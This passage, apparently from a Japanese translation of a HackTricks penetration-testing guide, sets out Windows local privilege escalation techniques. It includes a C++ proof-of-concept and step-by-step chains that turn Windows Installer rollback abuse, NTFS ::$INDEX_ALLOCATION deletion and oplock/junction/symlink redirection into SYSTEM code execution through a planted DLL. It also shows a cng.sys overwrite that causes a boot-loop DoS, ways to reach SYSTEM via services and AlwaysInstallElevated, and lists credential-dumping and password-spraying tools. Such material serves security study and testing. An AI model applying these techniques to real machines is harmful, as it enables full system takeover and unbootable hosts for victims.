CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用なプリミティブは junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名を、保護された rollback データとともに再作成させます。Cleanup は古い `TempPackages` 名を信頼して、新しいディレクトリを SYSTEM として削除します。reparse point は必要ないため、`FILE_FLAG_OPEN_REPARSE_POINT` と redirection-trust mitigation が意図する境界を回避できます。<sup>[[41]](#references)</sup>

この削除プリミティブは、以下の rollback chain に組み込めます。別個の `Installer\Folders` レコードを保持し、保護された `C:\Config.Msi` を削除し、NULL DACL を設定して再作成してから、Installer が DACL を強化する前に `WRITE_DAC` が許可された handle を保持します。事前に開いた handle を使い、`NtSetSecurityObject` で permissive な DACL を復元できます。その後、rollback が再開する前に生成済みの `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、このパスを修正しました。COM call は引き続き成功を返すことがありますが、攻撃者が制御するパスが `TempPackages` に登録されることはなくなります。method の戻り値が成功したかどうかで patch を検証するのではなく、2025 年 4 月の Windows security updates を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

この手法の概要は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **non-admin user** が実行できるよう、Installer を **"UAC Compliant"** に設定します。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall process がファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - 開いているファイル handle を `GetFinalPathNameByHandle` で **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になるタイミングを検出します。

- Step 3: Custom Syncing
    - `.msi` には、次の処理を行う **custom uninstall action (`SyncOnRbfWritten`)** が含まれています。
        - `.rbf` が書き込まれたことを通知する。
        - 続いて、別の event が発生するまで待機してから uninstall を続行する。

- Step 4: `.rbf` の削除をブロックする
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを **開きます**。これにより、ファイルの削除を **防止できます**。
    - その後、応答として通知し、uninstall を完了させます。
    - Windows Installer は `.rbf` の削除に失敗し、内容をすべて削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者であるあなたが `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` が空になり、Hijack の準備が整います**。

> この時点で、**SYSTEM-level の任意フォルダー削除 vulnerability を発動し、`C:\Config.Msi` を削除します**。

2. **Stage 2 – Rollback Script を悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ handle を開いたままにします。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的に失敗させる variable。
    - この install は、`.rbs` と `.rbf` を読み込む **rollback** を再度発動させるために使います。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - その filename を記録します。

- Step 9: Rollback 前に同期する
    - `.msi` には、次の処理を行う **custom install action (`SyncBeforeRollback`)** が含まれています。
        - `.rbs` が作成されたときに event を通知する。
        - 続行する前に待機する。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受け取った後:
        - Windows Installer が `C:\Config.Msi` に **強い ACL を再適用します**。
        - ただし、`WRITE_DAC` を持つ handle を引き続き保持しているため、**弱い ACL を再適用できます**。

> ACL は **handle を開くときにのみ適用される**ため、フォルダーへの書き込みは引き続き可能です。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の処理を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意ある DLL）を、特権のある場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **悪意ある SYSTEM-level payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発動させる
    - sync event を通知し、Installer を再開させます。
    - install を既知の時点で **意図的に失敗させる**ため、**type 19 custom action (`ErrorOut`)** が設定されています。
    - これにより **rollback が開始されます**。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意ある `.rbs` を読み込む。
        - `.rbf` DLL を target location にコピーする。
    - これで、**SYSTEM が読み込むパスに悪意ある DLL が配置されます**。

- Final Step: SYSTEM code を実行する
    - Hijack した DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで、コードが SYSTEM として実行されます**。


### 任意の File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback 手法（前述のもの）は、フォルダー全体（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、vulnerability で **任意の file deletion** しかできない場合はどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダの**インデックスメタデータ**が格納されています。

そのため、フォルダの `::$INDEX_ALLOCATION` ストリームを**削除すると**、NTFSはファイルシステムから**フォルダ全体を削除します**。

これは、次のような標準的なファイル削除APIを使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* の削除 API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
任意のファイルやフォルダーは削除できないものの、攻撃者が制御するフォルダーの**内容を削除できる** primitive がある場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- フォルダー内に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止されます**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock コールバック内 — 削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください。oplock が早期に解放されてしまいます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象としています。これを削除すると、フォルダーが削除されます。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし、junction + symlink によって、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意フォルダー作成から恒久的なDoSへ

**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します — **ファイルを書き込めない**場合や、**弱い権限を設定できない**場合でも可能です。

**重要な Windows driver** の名前を付けた**フォルダー**（ファイルではなく）を作成します。例：
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **あらかじめこのパスにフォルダーを作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダーを検出すると、**実際のドライバーを解決できず**、**クラッシュするか起動が停止します**。
- **フォールバックはなく**、外部から介入しない限り（例: ブート修復やディスクへのアクセス）、**復旧できません**。

### 特権ログ/バックアップパスと OM symlinks から任意ファイルの上書き / boot DoS へ

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ/エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points**でそのパスをリダイレクトすると、（**SeCreateSymbolicLinkPrivilege がなくても**）特権による書き込みを任意ファイルの上書きに利用できます。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先パスを格納した設定ファイルを攻撃者が書き換えられること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作があること（ログ、エクスポート、レポート）。

**攻撃の流れの例**
1. 設定ファイルを読み取り、特権ログの保存先を特定します。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テスト SMS を送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたターゲットを調べ（hex/PE parser）、破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込もうとし、**boot loop DoS** が発生します。この方法は、特権サービスが書き込み用に開く保護対象ファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に試される可能性があるため、破損データによる信頼性の高い DoS sink になります。



## **High Integrity から System へ**

### **新規サービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM へのパス**は、新しいサービスを**作成して実行するだけ**なので簡単です:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、または必要な処理を素早く実行することを確認してください。有効なserviceでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法について詳しくはこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは**[**こちら**](seimpersonate-from-high-to-system.md)**にあります。**

### From SeDebug + SeImpersonate to Full Token privileges

これらのtoken privilegesを持っている場合（おそらく、すでにHigh Integrityのプロセス内にいるときに見つかります）、SeDebug privilegeを使って**ほぼすべてのプロセス**（保護されたプロセスを除く）を開き、そのプロセスのtokenを**コピー**して、そのtokenで**任意のプロセスを作成**できます。\
通常、この手法では、すべてのtoken privilegesを持つSYSTEM実行中のプロセスを**選択します**（_はい、すべてのtoken privilegesを持っていないSYSTEMプロセスも見つかります_）。\
**提案した手法を実行するコード例は**[**こちら**](sedebug-+-seimpersonate-copy-token.md)**にあります。**

### **Named Pipes**

この手法はmeterpreterが`getsystem`で昇格する際に使われます。手順としては、**pipeを作成し、そのpipeに書き込むserviceを作成または悪用します**。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**し、SYSTEM privilegesを取得できます。\
[**name pipesについて詳しく知りたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
[name pipesを使って**high integrityからSystemに移行する方法の例はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEMとして実行されるプロセス**によって**ロード**されるdllを**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingもこの種のprivilege escalationに有効です。さらに、high integrityプロセスからは、dllのロードに使われるフォルダーへの**書き込み権限**があるため、ずっと**簡単に実行できます**。\
**Dll hijackingについて詳しくは**[**こちら**](dll-hijacking/index.html)**をご覧ください。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalationの手掛かりを探す最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 設定ミスの可能性をチェックし、情報を収集します（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカルでは-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン内でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（Admin権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioでコンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してhostをenumerateします（privescツールというより情報収集ツールです）（コンパイルが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpをC#に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（githubにprecompiled executableがあります）。推奨しません。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性をチェックします（python製のexe）。推奨しません。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をもとに作成されたツールです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NETの正しいバージョンを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害hostにインストールされている.NETのバージョンを確認するには、次のようにします:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Windows 権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [フォルダーのアクセス許可の弱点を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows 権限昇格 - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows 攻撃: AT は新しい定番 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP 完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [ペンテスター向け Windows 権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA macro phishing → hMailServer の credential 復号 → Veeam CVE-2023-27532 による SYSTEM 権限取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) と kernel token 窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox を追う: kernel の影で繰り広げられる攻防](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA システムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink の使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windows の Symbolic Link の悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF 移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows における危険な module 解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop と Pwn2Own: CLDFLT と DirectX kernel race condition を連鎖させた Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する I/O Ring: Windows 11 における完全な read/write exploit primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意のファイル削除を悪用した権限昇格とその他の優れた手法](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs の exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS 攻撃 パート 2: CVE-2020-1013、Windows 10 のローカル権限昇格 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager と Windows Vault を探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージの変更が権限昇格につながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent からの SSH 秘密鍵の抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業の update server を backdoor 工場に変える (0_o) – パート 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業の update server を backdoor 工場に変える (0_o) – パート 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer フォルダー削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM までの足跡をたどり直す](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services の共有メモリ offset に関する権限昇格アドバイザリ](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
